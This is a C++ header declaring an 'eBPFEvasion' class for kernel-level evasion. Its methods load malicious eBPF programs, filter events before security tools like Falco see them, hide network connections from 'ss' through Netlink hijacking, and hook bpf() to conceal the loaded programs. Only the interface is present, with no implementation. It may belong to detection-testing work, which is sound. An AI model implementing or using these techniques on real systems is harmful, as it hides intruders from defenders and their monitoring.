#pragma once

#include "common.h"
#include <vector>
#include <cstdint>

namespace kernel_evasion {

class eBPFEvasion {
public:
    eBPFEvasion();
    ~eBPFEvasion();

    // Load a malicious eBPF program
    Result<int> load_ebpf_program(const std::string& program_path,
                                  const std::string& program_name,
                                  const std::string& event_type);

    // Unload eBPF program
    ErrorCode unload_ebpf_program(const std::string& program_name);

    // Hook into eBPF monitoring pipeline (e.g., Falco)
    // Filters events before they reach security tools
    ErrorCode setup_event_filtering(const std::string& event_filter_path);

    // Setup Netlink socket-diagnostic response manipulation
    // Hides specific network connections from 'ss' command (VoidLink technique)
    ErrorCode setup_netlink_hijacking(const std::vector<uint16_t>& target_ports,
                                      const std::vector<std::string>& target_ips);

    // Hook bpf() syscall to hide malicious eBPF programs
    ErrorCode hook_bpf_syscall();

    // List loaded eBPF programs (for detection testing)
    std::vector<std::string> list_ebpf_programs();

    // Check if eBPF is supported on this kernel
    bool is_ebpf_supported();

private:
    std::vector<int> loaded_program_fds_;

    // Create eBPF program from source
    int compile_ebpf_program(const std::string& source_path);
};

}  // namespace kernel_evasion
